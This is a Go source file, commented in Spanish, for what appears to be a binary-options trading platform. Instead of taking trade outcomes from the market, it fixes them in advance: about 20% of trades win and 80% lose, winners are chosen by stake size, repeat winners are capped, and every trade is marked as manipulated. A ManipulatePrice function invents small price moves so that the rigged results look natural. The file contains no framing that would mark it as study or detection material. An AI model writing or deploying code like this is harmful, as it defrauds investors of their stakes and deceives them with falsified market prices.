package trading

import (
	"math/rand"
	"sort"
	"sync"
	"time"

	"tormentus/internal/models"
)

// TradingAlgorithm maneja la lógica de manipulación de resultados
type TradingAlgorithm struct {
	mutex           sync.RWMutex
	recentWinners   map[int64]time.Time // userID -> última vez que ganó
	winnerHistory   map[int64]int       // userID -> veces que ha ganado
}

// NewTradingAlgorithm crea una nueva instancia del algoritmo
func NewTradingAlgorithm() *TradingAlgorithm {
	return &TradingAlgorithm{
		recentWinners: make(map[int64]time.Time),
		winnerHistory: make(map[int64]int),
	}
}

// TradeGroup representa un grupo de trades para procesar
type TradeGroup struct {
	Trades    []*models.Trade
	Timestamp time.Time
}

// ProcessTradeResults procesa un grupo de trades y determina ganadores/perdedores
// Algoritmo: 20% ganadores (15% pequeños inversores, 5% grandes), 80% perdedores
func (ta *TradingAlgorithm) ProcessTradeResults(trades []*models.Trade) []*models.Trade {
	if len(trades) == 0 {
		return trades
	}

	ta.mutex.Lock()
	defer ta.mutex.Unlock()

	// Ordenar trades por monto (menor a mayor)
	sort.Slice(trades, func(i, j int) bool {
		return trades[i].Amount < trades[j].Amount
	})

	totalTrades := len(trades)
	
	// Calcular cuántos ganadores habrá
	totalWinners := int(float64(totalTrades) * 0.20) // 20% ganadores
	if totalWinners < 1 && totalTrades > 0 {
		totalWinners = 1 // Al menos 1 ganador si hay trades
	}

	// De los ganadores: 15% pequeños inversores, 5% grandes
	smallWinners := int(float64(totalWinners) * 0.75) // 75% del 20% = 15% del total
	bigWinners := totalWinners - smallWinners          // 25% del 20% = 5% del total

	// Filtrar usuarios que no pueden repetir (solo 2% puede repetir)
	eligibleForWin := make([]*models.Trade, 0)
	repeatWinners := make([]*models.Trade, 0)

	for _, trade := range trades {
		if lastWin, exists := ta.recentWinners[trade.UserID]; exists {
			// Si ganó recientemente, va a la lista de posibles repetidores
			if time.Since(lastWin) < 24*time.Hour {
				repeatWinners = append(repeatWinners, trade)
				continue
			}
		}
		eligibleForWin = append(eligibleForWin, trade)
	}

	// Seleccionar ganadores
	winners := make(map[int64]bool)
	
	// 1. Seleccionar pequeños inversores ganadores (del inicio de la lista ordenada)
	smallInvestors := ta.filterByAmountRange(eligibleForWin, 0, 0.5) // Primera mitad por monto
	ta.selectRandomWinners(smallInvestors, smallWinners, winners)

	// 2. Seleccionar grandes inversores ganadores (del final de la lista ordenada)
	bigInvestors := ta.filterByAmountRange(eligibleForWin, 0.5, 1.0) // Segunda mitad por monto
	ta.selectRandomWinners(bigInvestors, bigWinners, winners)

	// 3. Permitir que 2% de ganadores anteriores repitan
	repeatAllowed := int(float64(totalWinners) * 0.02)
	if repeatAllowed > 0 && len(repeatWinners) > 0 {
		ta.selectRandomWinners(repeatWinners, repeatAllowed, winners)
	}

	// Aplicar resultados
	for _, trade := range trades {
		if winners[trade.UserID] {
			trade.Status = models.TradeWon
			trade.IsManipulated = true
			trade.Profit = trade.Amount * (trade.Payout / 100)
			
			// Registrar ganador
			ta.recentWinners[trade.UserID] = time.Now()
			ta.winnerHistory[trade.UserID]++
		} else {
			trade.Status = models.TradeLost
			trade.IsManipulated = true
			trade.Profit = -trade.Amount
		}
		
		now := time.Now()
		trade.ClosedAt = &now
	}

	return trades
}

// filterByAmountRange filtra trades por rango de monto (percentil)
func (ta *TradingAlgorithm) filterByAmountRange(trades []*models.Trade, startPct, endPct float64) []*models.Trade {
	if len(trades) == 0 {
		return trades
	}

	startIdx := int(float64(len(trades)) * startPct)
	endIdx := int(float64(len(trades)) * endPct)
	
	if endIdx > len(trades) {
		endIdx = len(trades)
	}

	return trades[startIdx:endIdx]
}

// selectRandomWinners selecciona ganadores aleatorios de una lista
func (ta *TradingAlgorithm) selectRandomWinners(trades []*models.Trade, count int, winners map[int64]bool) {
	if len(trades) == 0 || count <= 0 {
		return
	}

	// Mezclar aleatoriamente
	rand.Shuffle(len(trades), func(i, j int) {
		trades[i], trades[j] = trades[j], trades[i]
	})

	selected := 0
	for _, trade := range trades {
		if selected >= count {
			break
		}
		if !winners[trade.UserID] {
			winners[trade.UserID] = true
			selected++
		}
	}
}

// CalculateRequiredLosses calcula cuánto se necesita de los perdedores para pagar a ganadores
func (ta *TradingAlgorithm) CalculateRequiredLosses(trades []*models.Trade) float64 {
	var totalWinnings float64
	for _, trade := range trades {
		if trade.Status == models.TradeWon {
			totalWinnings += trade.Profit
		}
	}
	return totalWinnings
}

// ManipulatePrice genera un precio manipulado para asegurar el resultado deseado
func (ta *TradingAlgorithm) ManipulatePrice(currentPrice float64, trade *models.Trade, shouldWin bool) float64 {
	// Pequeña variación para que parezca natural
	variation := (rand.Float64() * 0.001) + 0.0001 // 0.01% - 0.1%
	
	if trade.Direction == models.TradeUp {
		if shouldWin {
			return currentPrice * (1 + variation) // Precio sube
		}
		return currentPrice * (1 - variation) // Precio baja
	}
	
	// TradeDown
	if shouldWin {
		return currentPrice * (1 - variation) // Precio baja
	}
	return currentPrice * (1 + variation) // Precio sube
}

// GetUserWinHistory obtiene el historial de victorias de un usuario
func (ta *TradingAlgorithm) GetUserWinHistory(userID int64) int {
	ta.mutex.RLock()
	defer ta.mutex.RUnlock()
	return ta.winnerHistory[userID]
}

// CleanupOldRecords limpia registros antiguos
func (ta *TradingAlgorithm) CleanupOldRecords() {
	ta.mutex.Lock()
	defer ta.mutex.Unlock()

	cutoff := time.Now().Add(-24 * time.Hour)
	for userID, lastWin := range ta.recentWinners {
		if lastWin.Before(cutoff) {
			delete(ta.recentWinners, userID)
		}
	}
}
